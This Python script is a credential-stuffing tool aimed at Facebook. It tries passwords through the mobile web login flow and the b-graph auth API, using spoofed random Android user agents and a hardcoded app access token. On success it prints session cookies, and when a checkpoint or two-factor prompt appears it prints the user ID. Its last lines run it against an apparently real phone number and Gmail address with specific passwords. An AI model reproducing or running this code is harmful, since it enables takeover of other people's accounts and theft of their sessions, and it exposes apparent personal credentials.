import random, requests, re, json, time, os, string
import uuid
import secrets, hashlib







def normal():
    android_version = random.choice(["10", "11", "12", "13", "14", "15"])
    samsung_models = random.choice(["SM-A146B", "SM-A146P", "SM-A136B", "SM-A136U", "SM-A546B", "SM-A546E","SM-A546S", "SM-M146B", "SM-M146P", "SM-A736B", "SM-A736N", "SM-A336B","SM-A336E", "SM-A336M", "SM-S918B", "SM-S918U", "SM-S918N", "SM-S918W","SM-S916B", "SM-S916U", "SM-S916N", "SM-S916W", "SM-S911B", "SM-S911U","SM-S911N", "SM-S911W", "SM-F946B", "SM-F946U", "SM-F731B", "SM-F731U"])
    vivo_models = random.choice(["V2219", "V2243", "V2254", "V2256", "V2313", "V2314", "V2317", "V2318","V2320", "V2324", "V2325", "V2332", "V2333", "V2336", "V2337", "V2341","V2343", "V2345", "V2346", "V2353", "V2354", "V2356", "V2357", "V2361","V2362", "V2363", "V2364", "V2371", "V2372", "V2373", "V2374"])
    oppo_models = random.choice(["CPH2451", "CPH2457", "CPH2471", "CPH2473", "CPH2481", "CPH2483","CPH2491", "CPH2493", "CPH2495", "CPH2497", "CPH2499", "CPH2501","CPH2503", "CPH2505", "CPH2511", "CPH2513", "CPH2515", "CPH2521","CPH2523", "CPH2525", "CPH2531", "CPH2533", "CPH2535", "CPH2541","CPH2543", "CPH2545", "CPH2551", "CPH2553", "CPH2555", "CPH2557"])
    xiaomi_models = random.choice(["2201116SG", "2201116SR", "22041219G", "22041219I", "22101316G", "22101316I","22111317G", "22111317I", "2211133G", "2211133I", "23013PC75G", "23013PC75I","23021RAAEG", "23021RAAEI", "23028PC75G", "23028PC75I", "23049RAD8C", "23049RAD8G","23076RN4BI", "23076RN4BR", "23090RA98G", "23090RA98I", "23117RK66G", "23117RK66I","23128PC33G", "23128PC33I", "2312DRAABC", "2312DRAABG", "24031PN0DC", "24031PN0DG"])
    infinix_models = random.choice(["X650C","X652B","X665","X670","X6739","X6812","X682C","X683","X684","X685", "X688C","X689","X690","X691","X692","X693","X694","X695","X696","X697","X698","X699", "X700","X701","X702","X703","X704","X705","X706","X707"])
    model = random.choice([infinix_models, samsung_models, xiaomi_models, vivo_models, oppo_models])
    user_agent = f"Mozilla/5.0 (Linux; Android {android_version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{''.join(random.choice(string.digits) for _ in range(3))}.{str(random.randint(0,9))}.{str(random.randint(0,9))}.{str(random.randint(0,9))} Mobile Safari/537.36"
    return user_agent

def WEB_A(email, passwords):
    try:
        for password in passwords:
            ses = requests.Session()
            ug = normal()
            ses.headers.update({'Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"','Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"','Sec-Ch-Ua-Model':'"Nexus 5"','Sec-Ch-Ua-Platform':'"Android"','Sec-Ch-Ua-Platform-Version':'"6.0"','Sec-Fetch-Site':'same-origin','User-Agent':ug,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Cache-Control':'max-age=0','Dpr':'1','Priority':'u=0, i','Sec-Ch-Ua-Mobile':'?1','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','Viewport-Width':'360'})
            req = ses.get('https://m.facebook.com/', allow_redirects=True).text.replace('\\','')
            ses.headers.update({'Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"','Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"','Sec-Ch-Ua-Model':'"Nexus 5"','Sec-Ch-Ua-Platform':'"Android"','Sec-Ch-Ua-Platform-Version':'"6.0"','Sec-Fetch-Site':'same-origin','User-Agent':ug,'Accept':'*/*','Content-Length':'1577','Content-Type':'application/x-www-form-urlencoded;charset=UTF-8','Origin':'https://m.facebook.com','Priority':'u=1, i','Referer':'https://m.facebook.com/','Sec-Ch-Ua-Mobile':'?1','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors'})
            param = {
                "params":json.dumps({
                    "server_params":{
                    "credential_type":"password",
                    "username_text_input_id":"yubcjs:61",
                    "password_text_input_id":"yubcjs:62",
                    "login_source":"Login",
                    "login_credential_type":"none",
                    "server_login_source":"login",
                    "ar_event_source":"login_home_page",
                "should_trigger_override_login_success_action":'0',
                "should_trigger_override_login_2fa_action":'0',
                    "is_caa_perf_enabled":'0',
                    "reg_flow_source":"login_home_native_integration_point",
                    "caller":"gslr",
                    "is_from_landing_page":'0',
                    "is_from_empty_password":'0',
                    "is_from_password_entry_page":'0',
                    "INTERNAL__latency_qpl_marker_id":'none',
                    "INTERNAL__latency_qpl_instance_id":'none',
                    "device_id":'null',
                    "family_device_id":'null',
                    "waterfall_id":"null",
                    "offline_experiment_group":'null',
                    "layered_homepage_experiment_group":'null',
                    "is_platform_login":'0',
                    "is_from_logged_in_switcher":'0',
                    "is_from_logged_out":'0',
                    "access_flow_version":"F2_FLOW",
                    "INTERNAL_INFRA_THEME":"harm_f"},
                "client_input_params":{
                    "machine_id":"",
                    "contact_point":email,
                    "password":"#PWD_BROWSER:{}:{}:{}".format(str(0), str(time.time()), str(password)),
                    "accounts_list":[],
                    "fb_ig_device_id":[],
                    "secure_family_device_id":"",
                    "encrypted_msisdn":"",
                    "headers_infra_flow_id":"",
                    "try_num":'1',
                    "login_attempt_count":'1',
                    "event_flow":"login_manual",
                    "event_step":"home_page",
                    "openid_tokens":{},
                    "auth_secure_device_id":"",
                    "client_known_key_hash":"",
                    "has_whatsapp_installed":'0',
                    "sso_token_map_json_string":"",
                    "should_show_nested_nta_from_aymh":'0',
                    "lois_settings":{"lois_token":"","lara_override":""}}})}
            data = {
                '__aaid':'0',
                '__user':'0',
                '__a':'1',
                '__req':'d',
                '__hs':re.search(r'"haste_session":"(.*?)"',str(req)).group(1),
                'dpr':'1',
                '__ccg':'EXCELLENT',
                '__rev':re.search(r'"server_revision":(.*?),',str(req)).group(1),
                '__hsi':re.search(r'"hsi":"(.*?)"',str(req)).group(1),
                '__csr':'',
                'fb_dtsg':re.search(r'"dtsg":{"token":"(.*?)"',str(req)).group(1),
                'jazoest':re.search(r'"jazoest", "(.*?)"',str(req)).group(1),
                'lsd':re.search(r'"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1),
                'params':json.dumps(param)}
            query = {
                'appid':'com.bloks.www.bloks.caa.login.async.send_login_request',
                'type':'action',
                '__bkv':'b12ba24e6c7328a7dc3b351bc5cc86130f203876c77c9b8111fa1dfc37baacb6'}
            url = 'https://m.facebook.com/async/wbloks/fetch/?' + '&'.join(['{}={}'.format(a,b) for a,b in query.items()])
            post = ses.post(url, data=data, allow_redirects=True)
            print(post.text)
            if "c_user" in ses.cookies.get_dict():
                cookie = ';'.join(x+"="+y for x,y in ses.cookies.get_dict().items())
                print(cookie)
            elif "checkpoint" in ses.cookies.get_dict():
                try:
                    email = post.cookies.get_dict()['checkpoint'][13:28]
                except:
                    email = email
                print(email)
            elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in post.text or 'redirect_login_challenge' in post.text:
                try:
                    email = post.cookies.get_dict()['checkpoint'][13:28]
                except:
                    email = email
                print(email)
            elif "currentUser" in post.text:
                cookie = ';'.join(x+"="+y for x,y in ses.cookies.get_dict().items())
                print(cookie)
    except Exception as e:
        print(e)

def API_Y(email, passwords):
    try:
        ses = requests.Session()
        fbs = random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
        application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
        application_version_code=str(random.randint(000000000,999999999))
        modelx = random.choice(['GT-I9190', 'KOT49H', 'GT-I9192', 'GT-I9300I', 'KTU84P', 'GT-I9300', 'IMM76D', 'JSS15J', 'GT-I9301I', 'KOT4', 'GT-I9500', 'JDQ39', 'LRX22C', 'GT-N5100', 'JZO54K', 'GT-N7100', 'GT-N8000', 'GT-P3110', 'GT-P5100', 'IML74K', 'JDQ', 'GT-P5110', 'GT-P5200', 'GT-P5210', 'GT-P5220', 'GT-S7390', 'SAMSUNG', 'SM-A500F', 'SM-G532F', 'SM-G920F', 'SM-G935F', 'SM-J320F', 'SM-J510FN', 'SM-N920S', 'SM-T280', 'SM-A500FU', 'MMB29M', 'LRX22G', 'SM-A500H', 'SM-G900F', 'MMB29K', 'NRD90M', 'SM-G930F', 'SM-G950F', 'SM-J320FN', 'LMY47V', 'LMY4', 'SM-J320H', 'SM-J320M', 'NMF2', 'NMF26X', 'NMF26X;', 'SM-J701F', 'NRD90M;', 'SM-T111', 'SM-T230', 'SM-T231', 'SM-T235', 'KOT4SM-T310', 'SM-T311', 'SM-T315', 'SM-T525', 'SM-T531', 'SM-T535', 'SM-T555', 'SM-T561', 'SM-T705', 'SM-T805', 'SM*T820', 'SPH-L720', 'SM-A146B', 'SM-A146P', 'SM-A136B', 'SM-A136U', 'SM-A546B', 'SM-A546E', 'SM-A546S', 'SM-M146B', 'SM-M146P', 'SM-A736B', 'SM-A736N', 'SM-A336B', 'SM-A336E', 'SM-A336M', 'SM-S918B', 'SM-S918U', 'SM-S918N', 'SM-S918W', 'SM-S916B', 'SM-S916U', 'SM-S916N', 'SM-S916W', 'SM-S911B', 'SM-S911U', 'SM-S911N', 'SM-S911W', 'SM-F946B', 'SM-F946U', 'SM-F731B', 'SM-F731U'])
        user_agent = f'Davik/2.1.0 (Linux; U; Android {random.choice(["13","14","15"])}.0.0; {modelx} Build/{modelx} [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{fbs};FBDV/{modelx};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': email,
            'password': passwords,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login', 
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'locale': 'en_US', 
            'client_country_code': 'US', 
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
        ses.headers.update({'User-Agent': user_agent, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(2000, 4000)), 'X-FB-SIM-HNI': str(random.randint(2000, 4000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'})
        post_data  = ses.post('https://b-graph.facebook.com/auth/login', data=data).json()
        print(post_data)
        if ('session_key' in str(post_data)) and ('access_token' in str(post_data)):
            try:
                email = post_data['uid']
            except:
                email = email
            sb = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(24))
            cook = ''.join(['{}={};'.format(i['name'],i['value']) for i in post_data['session_cookies']])
            cookie = 'sb='+sb+';'+cook
            print(cookie)
        elif "www.facebook.com" in post_data['error']['error_msg']:
            try:
                email = json.loads(post_data['error']['error_msg'])['uid']
            except: pass
            print(email)
    except Exception as e:
        print(e)

API_Y(email="+959420794630", passwords=["099420794630"])
WEB_A(email="kam559310@gmail.com", passwords=["Haruto1230?"])